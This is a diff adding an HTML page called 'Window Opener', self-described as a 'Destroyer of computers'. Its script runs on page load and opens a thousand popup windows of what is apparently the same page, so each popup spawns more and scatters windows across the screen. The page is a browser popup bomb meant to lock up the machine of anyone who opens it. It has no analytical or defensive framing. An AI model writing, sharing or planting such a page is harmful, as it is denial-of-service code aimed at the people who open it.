@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>Window Opener</h1>
+<h2>Destroyer of computers</h2>
+<p id=sX></p>
+<p id=sY></p>
+<p id=x></p>
+<p id=y></p>
+<script>
+
+
+function getRandomNumber(min, max) {
+	// Generate a random number between min (inclusive) and max (inclusive)
+	return Math.floor(Math.random()*(max - min + 1) + min);
+};
+function myFunction() {
+	var sX ="1920";
+	var sY = "1080";
+	var x = getRandomNumber(1, sX);
+	var x1 = getRandomNumber(1,sX);
+	var y =getRandomNumber(50, sY);
+	var y1 = getRandomNumber(50,sY);
+  window.open("WinOpener.html","","width=200,height=100,top=" + x + ",left=" + y);
+window.moveTo(x1,y1);
+document.getElementById("sX").innerHTML = sX;
+document.getElementById("sY").innerHTML = sY;
+document.getElementById("x").innerHTML = x;
+document.getElementById("y").innerHTML = y;
+};
+for (let i = 0; i < 1000; i++) {
+  myFunction();
+};
+//for (let i = 0; i<1000000000; i++){
+//a = 1
+//b.innerHTML = a;
+//};
+</script>
+
+</body>
+</html>
